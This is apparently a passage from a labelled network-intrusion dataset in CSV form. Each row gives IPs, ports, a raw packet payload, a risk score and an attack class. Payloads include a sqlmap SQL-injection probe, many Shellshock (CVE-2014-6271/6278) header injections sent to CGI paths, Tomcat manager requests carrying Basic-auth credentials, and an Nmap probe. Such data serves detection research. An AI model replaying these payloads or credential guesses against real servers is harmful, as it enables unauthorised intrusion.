idx,s_ip,s_port,d_ip,d_port,protocol,payload,risk,class
246,68.97.68.249,47760,118.221.145.167,53682,TCP,......(,2,4_unknown
247,204.33.0.118,3389,44.4.169.173,46326,TCP( 6 ),".........4.............A...M..a..v............F~..ur.........I L:.....H.3\n....UyZw...0...\r@.5.../..................0...0..........a....i_.O...Ae..0\r..*.H..\r.....0.1.0...U...\rWIN-webServer0..\r210722081657Z.\r220121081657Z0.1.0...U...\rWIN-webServer0..\""0\r..*.H..\r..........0..\n......E..\r{$.E..T..O.F3}f.5K.....|..<gl..D@W....._.>S...)\"".....O..w..e........\r.5...*..n..V\nNd.!..1..Y...?..8.|.h..*]..:...........i..I.&.nV.%..b(/.Rh-....J|S0@...^.qzY_|..,.UB../-'.&)......,+d...TV..P.x^,...j9M.x.3..E.N.>..@..}...ZBSVp.&..I.....HHP......._j_........$0\""0...U.%..0\n..+.......0...U.......00\r..*.H..\r.........._........8..'Qs.gT...M4......DsH......QlL....au...q.a.U.,H)..~_%8N.v...r..@.7Y.c.f.......<KE..F......g..X.......-u...P.ct...RO.\n..........y.i....\\'f:W........<....?_.P..k[....k..........'!.\"".^.3<.R...........y...L..'vF.!)Sz.#}.....]....88.C.d._..E<../@Fd................0..N.._..6d....X..H4....?.....c........R..\n.\"",............P.W...X.Go..b.....I..[..!..S5&B/\\...._..B*;$@*...m?C...F....G..&v....>.....i.......O.....m.H..`.....({N/...@w.N..(....V..9N1..4..\rl....X.{`H..'QK*.g.].,.E.Mgx.w..........+R.@.G...&..\\..8...sw...;.e...!1...S.T9.Gv.0R0.C.\\.i.Z.....X..mN..jiVC.`Lf.....y..2A..kP...A..5.;..... .L.\n.l...5..o-;:....3....0Z..\rf)",3,3_post
248,146.164.6.53,34306,138.226.221.221,80,TCP,"GET /?id=user%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.3.4#stable (http://sqlmap.org)
Host: 192.168.136.132
Referer: http://192.168.136.132:80
Cache-Control: no-cache

",1,2_exploit
249,41.17.143.58,3389,187.125.110.184,43682,TCP( 6 ),".........4.............A...M..a..+.`......Q;........u.....m/._ .6.....+s.1.%6.FR...x...(.x..gv../..................0...0..........a....i_.O...Ae..0\r..*.H..\r.....0.1.0...U...\rWIN-webServer0..\r210722081657Z.\r220121081657Z0.1.0...U...\rWIN-webServer0..\""0\r..*.H..\r..........0..\n......E..\r{$.E..T..O.F3}f.5K.....|..<gl..D@W....._.>S...)\"".....O..w..e........\r.5...*..n..V\nNd.!..1..Y...?..8.|.h..*]..:...........i..I.&.nV.%..b(/.Rh-....J|S0@...^.qzY_|..,.UB../-'.&)......,+d...TV..P.x^,...j9M.x.3..E.N.>..@..}...ZBSVp.&..I.....HHP......._j_........$0\""0...U.%..0\n..+.......0...U.......00\r..*.H..\r.........._........8..'Qs.gT...M4......DsH......QlL....au...q.a.U.,H)..~_%8N.v...r..@.7Y.c.f.......<KE..F......g..X.......-u...P.ct...RO.\n..........y.i....\\'f:W........<....?_.P..k[....k..........'!.\"".^.3<.R...........y...L..'vF.!)Sz.#}.....]....88.C.d._..E<../@Fd................0.Q.....L.p..OP....EvS.Z..H.T..A.....S/t.....`........J..y..J...Z.....|W.+....}!..\r_.0uV......=..0._.....jK......s....MM....p62.8B.XN>.........k..s..}..6a.9t.,..Xo....v.F1.\""A......(0..k!..n|....JS.&..&>d..f`B.$.....Q.M.....QP.a..GW........XbEQ.A...i....a......s..SK.E.K.a..s?x....#..i...b?(L9q.4m..+...*._....X%...x...0.._\""m.\"".... .....Qv=.o.n.....-Cd.a....n.^...",3,3_post
250,193.64.231.203,14399,20.123.132.73,8080,TCP( 6 ),"GET /manager/html HTTP/1.1\r\nHost: 172.16.1.80:8080\r\nCache-Control: max-age=0\r\nAuthorization: Basic YWRtaW46bm9ydGhlcm4=\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: JSESSIONID=188F8C229EAD4FC819679F4ECD0789CB; JSESSIONID=CC45C29586478AE7E3777E6B7681F619\r\nConnection: close\r\n\r\n",1,3_post
251,84.241.223.124,47760,135.228.58.44,36532,TCP,......(,2,4_unknown
252,166.95.210.118,47760,24.164.29.160,32806,TCP,......(,2,4_unknown
253,119.101.218.67,47760,8.107.74.38,51530,TCP,......(,2,4_unknown
254,185.239.91.29,47760,175.10.240.183,59990,TCP,......(,2,4_unknown
255,27.113.163.150,47760,33.39.161.122,46744,TCP,......(,2,4_unknown
256,198.74.2.54,47760,97.78.91.214,58266,TCP,......(,2,4_unknown
257,156.254.173.170,80,11.176.17.36,34680,TCP,"HTTP/1.1 403 Forbidden
Date: Thu, 28 Jul 2022 08:20:47 GMT
Server: Apache/2.4.6 (CentOS)
Last-Modified: Thu, 16 Oct 2014 13:20:58 GMT
ETag: ""1321-5058a1e728280""
Accept-Ranges: bytes
Content-Length: 4897
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN"" ""http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd""><html><head>
<meta http-equiv=""content-type"" content=""text/html; charset=UTF-8"">
..<title>Apache HTTP Server Test Page powered by CentOS</title>
..<meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8"">

    <!-- Bootstrap -->
    <link href=""/noindex/css/bootstrap.min.css"" rel=""stylesheet"">
    <link rel=""stylesheet"" href=""noindex/css/open-sans.css"" type=""text/css"" />

<style type=""text/css""><!--.. 

body {
  font-family: ""Open Sans"", Helvetica, sans-serif;
  font-weight: 100;
  color: #ccc;
  background: rgba(10, 24, 55, 1);
  font-size: 16px;
}

h2, h3, h4 {
  font-weight: 200;
}

h2 {
  font-size: 28px;
}

.jumbotron {
  margin-bottom: 0;
  color: #333;
  background: rgb(212,212,221); /* Old browsers */
  background: radial-gradient(ellipse at center top, rgba(255,255,255,1) 0%,rgba(174,174,183,1) 100%); /* W3C */
}

.jumbotron h1 {
  font-size: 128px;
  font-weight: 700;
  color: white;
  text-shadow: 0px 2px 0px #abc,
               0px 4px 10px rgba(0,0,0,0.15),
               0px 5px 2px rgba(0,0,0,0.1),
               0px 6px 30px rgba(0,0,0,0.1);
}

.jumbotron p {
  font-size: 28px;
  font-weight: 100;
}

.main {
   background: white;
   color: #234;
   border-top: 1px solid rgba(0,0,0,0.12);
   padding-top: 30px;
   padding-bottom: 40px;
}

.footer {
   border-top: 1px solid rgba(255,255,255,0.2);
   padding-top: 30px;
}

    --></style>
</head>
<body>
  <div class=""jumbotron text-center"">
    <div class=""container"">
   .  <h1>Testing 123..</h1>
  ..<p class=""lead"">This page is used to test the proper operation of the <a href=""http://apache.org"">Apache HTTP server</a> after it has been installed. If you can read this page it means that this site is working properly. This server is powered by <a href=""http://centos.org"">CentOS</a>.</p>
..</div>
  </div>
  <div class=""main"">
    <div class=""container"">
       <div class=""row"">
  ...<div class=""col-sm-6"">
    ...<h2>Just visiting?</h2>
...  ..<p class=""lead"">The website you just visited is either experiencing problems or is undergoing routine maintenance.</p>
  .....<p>If you would like to let the administrators of this website know that you've seen this page instead of the page you expected, you should send them e-mail. In general, mail sent to the name ""webmaster"" and directed to the website's domain should reach the appropriate person.</p>
  .....<p>For example, if you experienced problems while visiting www.example.com, you should send e-mail to ""webmaster@example.com"".</p>
.  ...</div>
  ....<div class=""col-s",2,2_exploit
258,204.186.127.65,40364,35.226.68.77,80,TCP( 6 ),GET /ows-bin/ezmlm-browse HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\n\r\nGET /ows-bin/formmail.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /ows-bin/FormMail-clone.cgi HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\n\r\nGET /ows-bin/guestbook.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /ows-bin/helpdesk.cgi HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\n\r\nGET /ows-bin/index.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /ows-bin/index.php HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\n\r\nGET /ows-bin/index.pl HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\n\r\nGET /ows-bin/info.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /ows-bin/info.sh HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /ows-bin/loadpage.cgi HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\n\r\nGET /ows-bin/login.cgi HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\n\r\nGET /ows-bin/login.php HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\n\r\nGET /ows-bin/login.pl HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\n\r\nGET /ows-bin/pathtest.pl HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\n\r\nGET /ows-bin/php HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\n\r\nGET /ows-bin/php4 HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /ows-bin/php5 HTTP/1.1\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /ows-bin/php-cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nHo,1,2_exploit
259,103.231.63.67,46182,115.81.94.133,80,TCP( 6 ),GET /HNAP1 HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\r\n\r\n,1,1_reconnaissance
260,101.61.72.22,40190,219.251.139.71,80,TCP( 6 ),GET /cgi-915/FormMail-clone.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-915/guestbook.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-915/helpdesk.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-915/index.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-915/index.php HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-915/index.pl HTTP/1.1\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-915/info.cgi HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\n\r\nGET /cgi-915/info.sh HTTP/1.1\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\n,1,2_exploit
261,79.180.150.75,24770,191.22.224.0,8080,TCP( 6 ),"GET /manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=2DB51B70DF17EEE27863DBC19BBBA14A HTTP/1.1\r\nHost: 172.16.1.80:8080\r\nCache-Control: max-age=0\r\nAuthorization: Basic dG9tY2F0Om5ld21hbg==\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: JSESSIONID=F0D2FDE2E733CA90854182CA10BDC92C; JSESSIONID=6FB022130137336ED0BA1F4197B17BC0\r\nConnection: close\r\n\r\n",1,3_post
262,149.157.72.201,47760,152.191.246.76,37792,TCP,......(,2,4_unknown
263,115.7.19.248,47760,151.139.97.4,56016,TCP,......(,2,4_unknown
264,185.8.26.184,36544,112.170.120.118,80,TCP( 6 ),GET /scripts/test.py HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /scripts/test.sh HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /scripts/tmUnblock.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /scripts/uname.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /scripts/viewcvs.cgi HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\n\r\nGET /scripts/welcome HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\n\r\nGET /scripts/whois.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /scripts/ HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\n\r\nGET /cgi-win/ HTTP/1.1\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-win/admin.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /cgi-win/administrator.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-win/authLogin.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\n\r\nGET /cgi-win/bb-hist.sh HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-win/banner.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-win/book.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\n\r\nGET /cgi-win/cgiinfo.cgi HTTP/1.1\r\nHost: 172.16.1.50\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nConnection: Keep-Alive\r\n\r\nGET /cgi-win/cgitest.py HTTP/1.1\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\nConnection: Keep-Alive\r\nHost: 172.16.1.50\r\n\r\nGET /cgi-win/cgi_wrapper HTTP/1.1\r\nHost: 172.16.1.50\r\nConnection: Keep-Alive\r\nReferer: () { _; } >_[$($())] { echo 93e4r0-CVE-2014-6278: true; echo;echo; }\r\nUser-Agent: () { :; }; echo 93e4r0-CVE-2014-6271: true;echo;echo;\r\n\r\nGET /cgi-win/contact.cgi HTTP/1.1\r\nConnection: Keep-Alive\r\nRefe,1,2_exploit
